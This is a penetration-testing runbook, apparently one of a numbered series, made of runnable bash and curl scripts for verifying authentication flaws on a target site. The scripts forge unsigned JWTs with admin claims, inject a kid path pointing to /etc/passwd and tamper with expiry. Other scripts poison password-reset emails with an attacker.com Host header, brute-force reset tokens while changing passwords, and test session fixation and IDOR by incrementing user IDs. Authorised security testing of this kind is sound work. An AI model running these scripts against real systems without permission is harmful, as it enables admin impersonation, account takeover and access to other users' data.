# Auth Verify Runbook

## Purpose
Confirm auth vulnerabilities with high confidence. Produce repeatable, undeniable proof of the finding.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — `$OUTDIR/cookies.txt`
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/auth`
- `$JWT_TOKEN` — JWT token
- `$TEST_USER` — test account username/email
- `$TEST_PASS` — test account password

## Workflow A — JWT Attack Verification

### A1. Algorithm none full verification
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":'"$(date +%s)"'}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}."
curl -sk -v -H "Authorization: Bearer $TOKEN" "$TARGET_URL/api/admin/users" > "$EVIDENCE_DIR/jwt-none-verify.txt" 2>&1
grep -E '200 OK|HTTP/1.1 200' "$EVIDENCE_DIR/jwt-none-verify.txt" && echo "JWT NONE ATTACK VERIFIED" >> "$EVIDENCE_DIR/verify-log.txt"
```

### A2. JWT key confusion (HS256 with leaked public key)
```bash
curl -sk "$TARGET_URL/.well-known/jwks.json" -o "$OUTDIR/jwks.json" 2>/dev/null
curl -sk "$TARGET_URL/jwks.json" -o "$OUTDIR/jwks2.json" 2>/dev/null
```

### A3. JWT kid injection attempt
```bash
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT","kid":"../../../../../etc/passwd"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":'"$(date +%s)"'}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}.DUMMY"
curl -sk -v -H "Authorization: Bearer $TOKEN" "$TARGET_URL/api/me" > "$EVIDENCE_DIR/jwt-kid-verify.txt" 2>&1
```

### A4. JWT expiry bypass (modified exp claim)
```bash
FUTURE_EXP=$(( $(date +%s) + 864000 ))
PAYLOAD=$(echo -n '{"sub":"user","role":"user","exp":'"$FUTURE_EXP"'}' | base64 | tr -d '=' | tr '/+' '_-')
HEADER=$(echo "$JWT_TOKEN" | cut -d. -f1)
SIG=$(echo "$JWT_TOKEN" | cut -d. -f3)
MODIFIED_TOKEN="${HEADER}.${PAYLOAD}.${SIG}"
curl -sk -v -H "Authorization: Bearer $MODIFIED_TOKEN" "$TARGET_URL/api/me" > "$EVIDENCE_DIR/jwt-expiry-bypass.txt" 2>&1
```

## Workflow B — Password Reset Verification

### B1. Host header injection in password reset
```bash
curl -sk -v "$TARGET_URL/forgot-password" -H "Host: attacker.com" -H "X-Forwarded-Host: attacker.com" -d "email=$TEST_USER" > "$EVIDENCE_DIR/reset-host-header.txt" 2>&1
```

### B2. Reset token brute-force (numeric/resetable)
```bash
for i in $(seq 100000 100020); do
  curl -sk "$TARGET_URL/reset-password?token=$i" -d "password=NewPass123!" -o "$EVIDENCE_DIR/reset-brute-$i.txt"
  head -1 "$EVIDENCE_DIR/reset-brute-$i.txt" | grep -q "HTTP.*200" && echo "RESET TOKEN FOUND: $i" >> "$EVIDENCE_DIR/verify-log.txt" && break
done
```

## Workflow C — Session Hijack Verification

### C1. Verify session fixation
```bash
curl -sk -c "$EVIDENCE_DIR/sess-pre.txt" -o /dev/null "$TARGET_URL/login"
COOKIE_PRE=$(grep -o 'session=[a-f0-9]*' "$EVIDENCE_DIR/sess-pre.txt" || true)
curl -sk -b "$EVIDENCE_DIR/sess-pre.txt" -c "$EVIDENCE_DIR/sess-post.txt" -d "username=$TEST_USER&password=$TEST_PASS" "$TARGET_URL/login" -o /dev/null
curl -sk -b "$EVIDENCE_DIR/sess-pre.txt" "$TARGET_URL/dashboard" -o "$EVIDENCE_DIR/session-fixated.txt"
grep -qiE 'dashboard|logout|profile|account' "$EVIDENCE_DIR/session-fixated.txt" && echo "SESSION FIXATION VERIFIED" >> "$EVIDENCE_DIR/verify-log.txt"
```

### C2. Verify session not invalidated on logout
```bash
curl -sk -c "$EVIDENCE_DIR/sess-auth.txt" -d "username=$TEST_USER&password=$TEST_PASS" "$TARGET_URL/login" -o /dev/null
curl -sk -b "$EVIDENCE_DIR/sess-auth.txt" "$TARGET_URL/logout" -o /dev/null
curl -sk -b "$EVIDENCE_DIR/sess-auth.txt" "$TARGET_URL/dashboard" -o "$EVIDENCE_DIR/session-after-logout.txt"
grep -qiE 'dashboard|profile|account|welcome' "$EVIDENCE_DIR/session-after-logout.txt" && echo "SESSION NOT REVOKED ON LOGOUT" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Workflow D — IDOR Verification

### D1. Use session to access another user's resource
```bash
curl -sk -c "$EVIDENCE_DIR/sess-user1.txt" -d "username=user1@test.com&password=test123" "$TARGET_URL/login" -o /dev/null
USER1_ID=$(curl -sk -b "$EVIDENCE_DIR/sess-user1.txt" "$TARGET_URL/api/me" | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))")
USER2_ID=$((USER1_ID + 1))
curl -sk -b "$EVIDENCE_DIR/sess-user1.txt" -o "$EVIDENCE_DIR/idor-access.txt" -w "\nHTTP_CODE: %{http_code}\n" "$TARGET_URL/api/user/$USER2_ID"
grep -qE 'HTTP_CODE: 200' "$EVIDENCE_DIR/idor-access.txt" && echo "IDOR VERIFIED: accessing user $USER2_ID as $USER1_ID" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Stop Conditions
- JWT altered and accepted by server -> verified, stop
- Password reset with injected Host header -> verified, stop
- Session fixation confirmed -> verified, stop
- IDOR confirmed -> verified, stop
- All payloads rejected with 401/403 -> likely not vulnerable

## Evidence to Capture
- Full `curl -v` output for each successful verification
- Request and response body
- Modified JWT token (before and after)
- Session cookie (before and after)

## Next Routing
- Verified -> `runbooks/04-impact-escalation.md`
- Cannot verify -> `runbooks/06-false-positive-filter.md`
